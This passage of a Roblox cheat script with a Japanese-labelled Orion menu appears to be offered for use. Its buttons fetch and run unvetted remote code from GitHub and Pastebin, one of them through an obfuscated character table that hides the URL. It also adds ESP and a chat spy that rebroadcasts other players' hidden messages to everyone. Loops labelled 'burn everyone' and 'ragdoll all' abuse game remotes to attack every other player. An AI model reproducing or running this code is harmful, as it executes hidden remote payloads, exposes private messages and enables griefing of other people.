          		print("button pressed")SGTSOBF_WWwwWWWww={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\92","\49","\48","\52","\92","\49","\49","\54","\92","\49","\49","\54","\92","\49","\49","\50","\92","\49","\49","\53","\92","\53","\56","\92","\52","\55","\92","\52","\55","\92","\49","\49","\50","\92","\57","\55","\92","\49","\49","\53","\92","\49","\49","\54","\92","\49","\48","\49","\92","\57","\56","\92","\49","\48","\53","\92","\49","\49","\48","\92","\52","\54","\92","\57","\57","\92","\49","\49","\49","\92","\49","\48","\57","\92","\52","\55","\92","\49","\49","\52","\92","\57","\55","\92","\49","\49","\57","\92","\52","\55","\92","\53","\52","\92","\53","\49","\92","\56","\52","\92","\52","\56","\92","\49","\48","\50","\92","\49","\48","\55","\92","\54","\54","\92","\49","\48","\57","\92","\49","\48","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_HHhHHHHHh="";for _,SGTSOBF_dDDDDDDdD in pairs(SGTSOBF_WWwwWWWww)do SGTSOBF_HHhHHHHHh=SGTSOBF_HHhHHHHHh..SGTSOBF_dDDDDDDdD;end;SGTSOBF_CCCcCCcCC=function(SGTSOBF_fFFFFfFfF)loadstring(SGTSOBF_fFFFFfFfF)()end;SGTSOBF_CCCcCCcCC(SGTSOBF_HHhHHHHHh)
     end
    })
scriptTab:AddButton({
    	Name = "奈落",
    	Callback = function()
          		print("button pressed")loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
    end})
scriptTab:AddButton({
    	Name = "アニメーション",
    	Callback = function()
          		print("button pressed")loadstring(game:HttpGet(('https://pastebin.com/raw/1p6xnBNf'),true))()
end
})

scriptTab:AddButton({
    	Name = "お絵描き",
    	Callback = function()
          		print("button pressed")loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/Draw-To-Chat-Obfuscated/refs/heads/main/Draw%20to%20Chat"))()      	
  end    
})

local miscTab = Window:MakeTab({
      Name = "その他",
      Icon = "",
      PremiumOnly = false
})

local RunService = game:GetService("RunService")
local localPlayer = Players.LocalPlayer
local espEnabled = false
local espConnections = {}
local function createESP(player)
if not player.Character or player.Character:FindFirstChild("ESPBillboard") then return end
local billboardGui = Instance.new("BillboardGui")
billboardGui.Name = "ESPBillboard"
billboardGui.Size = UDim2.new(0, 50, 0, 60) 
billboardGui.AlwaysOnTop = true
billboardGui.Adornee = player.Character:FindFirstChild("HumanoidRootPart")
billboardGui.StudsOffset = Vector3.new(0, 5, 0) 

local frame = Instance.new("Frame", billboardGui)
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundTransparency = 1

    
local imageLabel = Instance.new("ImageLabel", frame)
imageLabel.Size = UDim2.new(1, 0, 0.5, 0)
imageLabel.Position = UDim2.new(0, 0, 0, 0)
imageLabel.BackgroundTransparency = 1
imageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(player.UserId) .. "&w=150&h=150"
local textLabel = Instance.new("TextLabel", frame)
textLabel.Size = UDim2.new(0.8, 0, 0.25, 0) 
textLabel.Position = UDim2.new(0.1, 0, 0.5, 0) 
textLabel.BackgroundTransparency = 1
textLabel.Text = player.DisplayName 
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextScaled = true
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextWrapped = true
textLabel.TextSize = 10
billboardGui.Parent = player.Character
end
local function updateESP()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            createESP(player)
        end
    end
end

local function disableESP()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("ESPBillboard") then
            player.Character.ESPBillboard:Destroy()
        end
    end
   if espConnections.RenderStepped then
        espConnections.RenderStepped:Disconnect()
        espConnections.RenderStepped = nil
    end
end
local function toggleESP(state)
    espEnabled = state
    if espEnabled then
        espConnections.RenderStepped = RunService.RenderStepped:Connect(updateESP)
        print("ESPを有効化しました")
    else
        disableESP()
        print("ESPを無効化しました")
    end
end
Players.PlayerRemoving:Connect(function(player)
    if player.Character and player.Character:FindFirstChild("ESPBillboard") then
        player.Character.ESPBillboard:Destroy()
    end
end)

miscTab:AddToggle({
    Name = "ESP",
    Default = false,
    Callback = function(state)
        toggleESP(state)
    end
})

local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local Config = {
    enabled = false,
    spyOnMyself = true,}
local PrivateProperties = {
    Color = Color3.fromRGB(0, 500, 0),
    Font = Enum.Font.SourceSansBold,
    TextSize = 18,
}
local function onChatted(p, msg)
    if Config.enabled and (Config.spyOnMyself == true or p ~= player) then
        msg = msg:gsub("[\n\r]", ''):gsub("\t", ' '):gsub("[ ]+", ' ')
        local hidden = true
        local conn = getmsg.OnClientEvent:Connect(function(packet, channel)
            if packet.SpeakerUserId == p.UserId and packet.Message == msg:sub(#msg - #packet.Message + 1) and (channel == "All" or (channel == "Team" and Players[packet.FromSpeaker].Team == player.Team)) then
                hidden = false
            end
        end)
        wait(1)
        conn:Disconnect()
        if hidden and Config.enabled then
            local formattedMessage = "[" .. p.Name .. "] : " .. msg
            saymsg:FireServer(formattedMessage, "All")
        end
    end
end
for _, p in ipairs(Players:GetPlayers()) do
    p.Chatted:Connect(function(msg) onChatted(p, msg) end)
end
Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg) onChatted(p, msg) end)
end)

miscTab:AddToggle({
    Name = "チャットスパイ",
    Default = false,
    Callback = function(value)
        Config.enabled = value
        PrivateProperties.Text = "{あそこ痒い" .. (Config.enabled and "ENABLED" or "DISABLED") .. "}"
        StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
end
})

local GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
local MenuToys = ReplicatedStorage:WaitForChild("MenuToys")
local SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
local localPlayer = Players.LocalPlayer
local playerCharacter = localPlayer.Character or localPlayer.CharacterAdded:Wait()
localPlayer.CharacterAdded:Connect(function(character)
    playerCharacter = character
end)
local toysFolder = workspace:FindFirstChild(localPlayer.Name.."SpawnedInToys")

local function spawnItemCf(itemName, cframe)
    task.spawn(function()
        local rotation = Vector3.new(0, 0, 0)
        ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(itemName, cframe, rotation)
    end)
end

local function DestroyT(toy)
    local toy = toy or toysFolder:FindFirstChildWhichIsA("Model")
    MenuToys.DestroyToy:FireServer(toy)
end

local function fireAll()
    while true do
        local success, err = pcall(function()
            if toysFolder:FindFirstChild("Campfire") then
                DestroyT(toysFolder:FindFirstChild("Campfire"))
                wait(0.5)
            end
            spawnItemCf("Campfire", playerCharacter.Head.CFrame)
            local campfire = toysFolder:WaitForChild("Campfire")
            local firePlayerPart
            for _, part in pairs(campfire:GetChildren()) do
                if part.Name == "FirePlayerPart" then
                    part.Size = Vector3.new(10, 10, 10)
                    firePlayerPart = part
                    break
                end
            end
            local originalPosition = playerCharacter.Torso.Position
            SetNetworkOwner:FireServer(firePlayerPart, firePlayerPart.CFrame)
            playerCharacter:MoveTo(firePlayerPart.Position)
            wait(0.3)
            playerCharacter:MoveTo(originalPosition)
            local bodyPosition = Instance.new("BodyPosition")
            bodyPosition.P = 20000
            bodyPosition.Position = playerCharacter.Head.Position + Vector3.new(0, 600, 0)
            bodyPosition.Parent = campfire.Main
            while true do
                for _, player in pairs(Players:GetChildren()) do
                    pcall(function()
                        bodyPosition.Position = playerCharacter.Head.Position + Vector3.new(0, 600, 0)
                        if player.Character and player.Character.HumanoidRootPart and player.Character ~= playerCharacter then
                            firePlayerPart.Position = player.Character.HumanoidRootPart.Position or player.Character.Head.Position
                            wait()
                        end
                    end)
                end  
                wait()
            end
        end)
        if not success then
            warn("Error in fireAll: " .. tostring(err))
        end
        wait()
    end
end

miscTab:AddToggle({
    Name = "全員燃やす",
    Default = false,
    Color = Color3.fromRGB(0, 255, 255),
    Save = true,
    Callback = function(enabled)
        if enabled then
            fireAllCoroutine = coroutine.create(fireAll)
            coroutine.resume(fireAllCoroutine)
        else
            if fireAllCoroutine then
                coroutine.close(fireAllCoroutine)
                fireAllCoroutine = nil
            end
        end
    end
})

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = Players.LocalPlayer
local toysFolder = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

local function spawnItem(itemName, position)
local cframe = CFrame.new(position)
local rotation = Vector3.new(0, 90, 0)
    ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(itemName, cframe, rotation)
end

local function ragdollAll()
    while true do
        local success, err = pcall(function()
            if not toysFolder:FindFirstChild("FoodBanana") then
                spawnItem("FoodBanana", Vector3.new(-72.9304581, -5.96906614, -265.543732))
            end
            local banana = toysFolder:WaitForChild("FoodBanana", 5)
            local bananaPeel
             for _, part in pairs(banana:GetChildren()) do
                if part.Name == "BananaPeel" and part:FindFirstChild("TouchInterest") then
                    part.Size = Vector3.new(10, 10, 10)
                    part.Transparency = 1
                    bananaPeel = part
                    break
                end
            end
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local humanoidRootPart = player.Character.HumanoidRootPart
                    pcall(function()
                        bananaPeel.Position = humanoidRootPart.Position
                        wait()
                    end)
                end
            end
        end)
        if not success then
            warn("Error in ragdollAll: " .. tostring(err))
        end
        wait(0.02)
    end
end

local ragdollAllCoroutine
miscTab:AddToggle({
    Name = "ラグドールオール",
    Color = Color3.fromRGB(0, 255, 255),
    Default = false,
    Save = true,
    Callback = function(enabled)
        if enabled then
            print("Ragdoll All 開始")
            ragdollAllCoroutine = coroutine.create(ragdollAll)
            coroutine.resume(ragdollAllCoroutine)
        else
            if ragdollAllCoroutine then
                coroutine.close(ragdollAllCoroutine)
                ragdollAllCoroutine = nil
                print("Ragdoll All 停止")
            end
        end
    end
})

local MainTab = Window:MakeTab({
    Name = "スロット",
    Icon = "",
    PremiumOnly = false
})

local MainSection = MainTab:AddSection({
    Name = "次回せるまでの時間"
})

local timerLabel

MainSection:AddLabel("Time Until Next Spin:")
timerLabel = MainSection:AddLabel("Loading...")

local RunService = game:GetService("RunService")

local function updateTimer()
local success, result = pcall(function()
        return workspace.Slots.Slots.Screen.SlotGui.TimeLeftFrame.TimeText.Text
end)

    if success then
        timerLabel:Set(result)
    else
        timerLabel:Set("Error: Unable to fetch timer.")
    end
end

RunService.RenderStepped:Connect(updateTimer)


OrionLib:Init()
else
    end
warn()
